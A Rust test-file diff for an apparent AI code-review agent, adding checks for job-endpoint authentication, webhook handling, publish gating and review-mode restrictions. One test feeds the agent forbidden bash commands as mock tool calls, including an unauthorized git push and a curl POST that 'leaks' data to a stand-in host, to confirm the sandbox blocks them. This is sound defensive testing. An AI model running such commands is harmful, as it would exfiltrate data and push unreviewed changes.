@@ -41,6 +41,9 @@ fn create_test_config() -> Config {
         gemini_api_key: None,
         ollama_base_url: None,
         sandbox_driver: "local".to_string(),
+        job_api_token: Some("test-secret-with-thirty-two-chars-long".to_string()),
+        max_concurrent_jobs: 10,
+        sandbox_workspace_dir: "/tmp/test-openreview-sandbox-workspaces".into(),
         host: "127.0.0.1".to_string(),
         port: 3000,
     }
@@ -167,6 +170,66 @@ async fn test_manifest_endpoint() {
     assert_eq!(json_val["name"], "OpenReview AI Agent");
     assert_eq!(json_val["default_permissions"]["pull_requests"], "write");
     assert_eq!(json_val["default_permissions"]["contents"], "write");
+    assert_eq!(json_val["public"], false);
+}
+
+#[tokio::test]
+async fn test_job_endpoints_require_operator_authentication() {
+    let config = create_test_config();
+    let llm: Arc<dyn LlmProvider> = Arc::new(MockLlm::new(vec![]));
+    let coordinator = Arc::new(WorkflowCoordinator::new(
+        config.clone(),
+        llm,
+        Arc::new(LocalSandboxDriver),
+    ));
+    let app = create_router(AppState {
+        config,
+        coordinator,
+        metrics: Arc::new(Metrics::new()),
+        jobs: Arc::new(JobManager::default()),
+    });
+
+    for path in ["/api/jobs", "/api/jobs/does-not-exist"] {
+        let response = app
+            .clone()
+            .oneshot(Request::builder().uri(path).body(Body::empty()).unwrap())
+            .await
+            .unwrap();
+        assert_eq!(response.status(), StatusCode::UNAUTHORIZED, "{path}");
+        let wrong = app
+            .clone()
+            .oneshot(
+                Request::builder()
+                    .uri(path)
+                    .header("authorization", "Bearer invalid-token")
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(wrong.status(), StatusCode::UNAUTHORIZED, "{path}");
+    }
+    let authorized = app
+        .clone()
+        .oneshot(
+            Request::builder()
+                .uri("/api/jobs")
+                .header(
+                    "authorization",
+                    "Bearer test-secret-with-thirty-two-chars-long",
+                )
+                .body(Body::empty())
+                .unwrap(),
+        )
+        .await
+        .unwrap();
+    assert_eq!(authorized.status(), StatusCode::OK);
+    assert!(
+        authorized
+            .headers()
+            .get("access-control-allow-origin")
+            .is_none()
+    );
 }
 
 #[tokio::test]
@@ -284,6 +347,25 @@ async fn test_webhook_signature_and_deduplication() {
     let payload_bytes = serde_json::to_vec(&payload).unwrap();
     let sig = sign_payload(&secret, &payload_bytes);
 
+    // A signed webhook without installation context must NOT borrow the global
+    // fallback installation ID configured for standalone CLI use.
+    let mut missing_installation = payload.clone();
+    missing_installation
+        .as_object_mut()
+        .unwrap()
+        .remove("installation");
+    let missing_bytes = serde_json::to_vec(&missing_installation).unwrap();
+    let missing_req = Request::builder()
+        .method("POST")
+        .uri("/api/webhooks/github")
+        .header("x-github-event", "issue_comment")
+        .header("x-github-delivery", "missing-installation")
+        .header("x-hub-signature-256", sign_payload(&secret, &missing_bytes))
+        .body(Body::from(missing_bytes))
+        .unwrap();
+    let response = app.clone().oneshot(missing_req).await.unwrap();
+    assert_eq!(response.status(), StatusCode::BAD_REQUEST);
+
     let req_valid = Request::builder()
         .method("POST")
         .uri("/api/webhooks/github")
@@ -372,6 +454,53 @@ async fn test_agent_react_loop_review_mode_blocks_write_file() {
 }
 
 #[tokio::test]
+async fn test_review_mode_rejects_shell_file_and_git_mutation_attempts() {
+    let temp = tempfile::tempdir().unwrap();
+    let sandbox = LocalSandbox::new(temp, "owner/repo".into(), String::new());
+    sandbox.write_file("readme.txt", "untouched").await.unwrap();
+    let commands = [
+        "echo changed > readme.txt",
+        "git add -A && git commit -m unauthorized",
+        "git push origin HEAD:main",
+        "curl -X POST https://example.org --data leak",
+    ];
+    let mut responses = commands
+        .iter()
+        .enumerate()
+        .map(|(i, cmd)| LlmResponse {
+            content: None,
+            tool_calls: vec![ToolCall {
+                id: format!("forbidden-{i}"),
+                name: "bash".into(),
+                arguments: json!({"command": cmd}),
+            }],
+            input_tokens: 1,
+            output_tokens: 1,
+        })
+        .collect::<Vec<_>>();
+    responses.push(LlmResponse {
+        content: Some("Finished review".into()),
+        tool_calls: vec![],
+        input_tokens: 1,
+        output_tokens: 1,
+    });
+    let mock_llm = MockLlm::new(responses);
+    let runner = AgentRunner::new(
+        &sandbox,
+        None,
+        &mock_llm,
+        "owner/repo",
+        1,
+        WorkflowMode::Review,
+        true,
+        &[],
+        None,
+    );
+    assert!(runner.run(vec![]).await.unwrap().success);
+    assert_eq!(sandbox.read_file("readme.txt").await.unwrap(), "untouched");
+}
+
+#[tokio::test]
 async fn test_agent_react_loop_fix_mode_with_tools() {
     let temp = tempfile::tempdir().unwrap();
     let sandbox = LocalSandbox::new(temp, "owner/repo".to_string(), String::new());
@@ -432,7 +561,8 @@ async fn test_agent_react_loop_fix_mode_with_tools() {
     let result = runner.run(vec![]).await.unwrap();
 
     assert!(result.success);
-    assert_eq!(result.replies_posted, 1);
+    // A Fix agent's report is held until the trusted publisher confirms the push.
+    assert_eq!(result.replies_posted, 0);
     assert_eq!(result.steps_taken, 3);
     assert_eq!(result.termination_reason, AgentTerminationReason::Completed);
 
@@ -516,6 +646,7 @@ async fn test_publishing_prevented_in_review_mode() {
         actor: "alice".to_string(),
         dry_run: false,
         head_sha: None,
+        from_webhook: false,
         messages: vec![],
     };
 
@@ -545,6 +676,7 @@ async fn test_publishing_dry_run_suppresses_push() {
         actor: "alice".to_string(),
         dry_run: true, // Dry Run Active
         head_sha: None,
+        from_webhook: false,
         messages: vec![],
     };
 
@@ -555,6 +687,32 @@ async fn test_publishing_dry_run_suppresses_push() {
     assert_eq!(record.action_taken, "dry_run_simulated");
     assert!(record.success);
     assert_eq!(record.published_sha, None);
+}
+
+#[tokio::test]
+async fn test_fix_publisher_requires_authenticated_client_even_with_changes() {
+    let temp = tempfile::tempdir().unwrap();
+    let sandbox = LocalSandbox::new(temp, "owner/repo".into(), String::new());
+    sandbox.write_file("edited.txt", "changed").await.unwrap();
+    let params = WorkflowParams {
+        repo_full_name: "owner/repo".into(),
+        pr_number: 19,
+        base_branch: "main".into(),
+        pr_branch: "fix".into(),
+        comment_id: None,
+        installation_id: Some(101),
+        mode: WorkflowMode::Fix,
+        actor: "alice".into(),
+        dry_run: false,
+        head_sha: Some("starting-commit".into()),
+        from_webhook: true,
+        messages: vec![],
+    };
+    let err = WorkflowPublisher::evaluate_and_publish(&sandbox, None, &params)
+        .await
+        .unwrap_err();
+    assert!(matches!(err, openreview::error::AppError::Unauthorized(_)));
+    assert_eq!(sandbox.read_file("edited.txt").await.unwrap(), "changed");
 }
 
 #[tokio::test]
@@ -645,6 +803,7 @@ fn test_bot_command_matrix() {
 #[test]
 fn test_verification_report_markdown_generation() {
     let report = VerificationReport {
+        outcome: openreview::workflow::verification::VerificationOutcome::Failed,
         all_passed: false,
         checks: vec![VerificationCheck {
             name: "Linter".to_string(),
@@ -666,6 +825,11 @@ async fn test_project_verifier_detects_clean_empty_dir() {
     let temp = tempfile::tempdir().unwrap();
     let sandbox = LocalSandbox::new(temp, "owner/repo".to_string(), String::new());
     let report = ProjectVerifier::run_verification(&sandbox).await.unwrap();
-    assert!(report.all_passed);
+    // A repository with no detected checks must not be automatically published.
+    assert!(!report.all_passed);
+    assert_eq!(
+        report.outcome,
+        openreview::workflow::verification::VerificationOutcome::Unavailable
+    );
     assert!(report.checks.is_empty());
 }
